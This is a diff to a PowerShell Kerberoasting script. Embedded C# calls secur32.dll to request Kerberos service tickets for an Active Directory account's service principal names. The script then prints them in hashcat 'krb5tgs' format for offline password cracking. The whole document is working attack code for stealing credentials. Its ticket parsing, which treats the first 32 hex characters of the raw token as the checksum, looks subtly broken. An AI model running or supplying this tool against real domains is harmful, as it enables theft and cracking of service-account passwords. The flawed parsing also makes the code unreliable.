@@ -33,6 +33,9 @@ public class K {
     [DllImport("secur32.dll", SetLastError = true)]
     public static extern int FreeCredentialsHandle(IntPtr phCredential);
 
+    [DllImport("secur32.dll", SetLastError = true)]
+    public static extern int FreeContextBuffer(IntPtr pvContextBuffer);
+
     [StructLayout(LayoutKind.Sequential)]
     public struct SecBuffer {
         public uint cbBuffer;
@@ -47,7 +50,7 @@ public class K {
         public IntPtr pBuffers;
     }
 
-    public static byte[] GetTicketRaw(string spn) {
+    public static byte[] GetRawTicket(string spn) {
         IntPtr cred = IntPtr.Zero;
         IntPtr ctx = IntPtr.Zero;
         IntPtr expiry1 = IntPtr.Zero;
@@ -57,7 +60,7 @@ public class K {
         try {
             SecBuffer secBuf = new SecBuffer();
             secBuf.BufferType = 2; // SECBUFFER_TOKEN
-            secBuf.cbBuffer = 12288;
+            secBuf.cbBuffer = 12288; // 12KB buffer
             secBuf.pvBuffer = Marshal.AllocHGlobal((int)secBuf.cbBuffer);
 
             IntPtr pSecBuf = Marshal.AllocHGlobal(Marshal.SizeOf(secBuf));
@@ -84,7 +87,7 @@ public class K {
                     ref cred,
                     IntPtr.Zero,
                     spn,
-                    0x00001000,
+                    0x00001000, // ISC_REQ_ALLOCATE_MEMORY
                     0,
                     16,
                     IntPtr.Zero,
@@ -109,7 +112,7 @@ public class K {
 }
 "@
 
-function Get-KerberosHashcatFormat {
+function Get-KerberoastHashcatFormat {
     [CmdletBinding()]
     param(
         [Parameter(Mandatory)]
@@ -119,7 +122,7 @@ function Get-KerberosHashcatFormat {
     try {
         $user = Get-ADUser -Filter "samaccountname -eq '$SamAccountName'" -Properties servicePrincipalName
         if (-not $user) {
-            Write-Error "User '$SamAccountName' not found."
+            Write-Error "User '$SamAccountName' not found in Active Directory."
             return
         }
 
@@ -129,33 +132,33 @@ function Get-KerberosHashcatFormat {
         }
 
         foreach ($spn in $user.servicePrincipalName) {
-            Write-Host "Requesting ticket for SPN: $spn"
+            try {
+                Write-Host "Requesting ticket for SPN: ${spn}"
 
-            $ticketBytes = [K]::GetTicketRaw($spn)
-            if (-not $ticketBytes) {
-                Write-Warning "Failed to retrieve ticket for $spn"
-                continue
-            }
+                $ticketBytes = [K]::GetRawTicket($spn)
+                if (-not $ticketBytes) {
+                    Write-Warning "Failed to retrieve ticket for ${spn}."
+                    continue
+                }
 
-            $ticketHex = [BitConverter]::ToString($ticketBytes) -replace '-'
+                $hex = [BitConverter]::ToString($ticketBytes).Replace("-", "")
+                
+                if ($hex -match '^(?<checksum>.{32})(?<encdata>.+)$') {
+                    $checksum = $matches['checksum']
+                    $encdata = $matches['encdata']
+                    $domain = $env:USERDNSDOMAIN
+                    $cleanSpn = $spn -replace ":", "~"
+                    $hashcat = "\$krb5tgs\$23\$*${SamAccountName}`$${domain}`$${cleanSpn}*$checksum`$$encdata"
+                    Write-Output "`n[+] Hashcat Format for ${spn}:`n$hashcat`n"
+                } else {
+                    Write-Warning "Unable to parse ticket for ${spn}."
+                }
 
-            # Extract checksum and encdata (simplified)
-            if ($ticketHex -match '.*?(?<checksum>.{32})(?<encdata>.+)$') {
-                $checksum = $matches['checksum']
-                $encdata = $matches['encdata']
-
-                $spnSanitized = $spn -replace ':', '~'
-                $hashcat = "\$krb5tgs\$23\$*$SamAccountName\$$spnSanitized*$checksum`$$encdata"
-
-                Write-Output "`n[+] Hashcat Format:"
-                Write-Output $hashcat
-            }
-            else {
-                Write-Warning "Failed to parse ticket for $spn."
+            } catch {
+                Write-Warning "Error while processing SPN ${spn}: $_"
             }
         }
-    }
-    catch {
-        Write-Error "Error: $_"
+    } catch {
+        Write-Error "General error: $_"
     }
 }
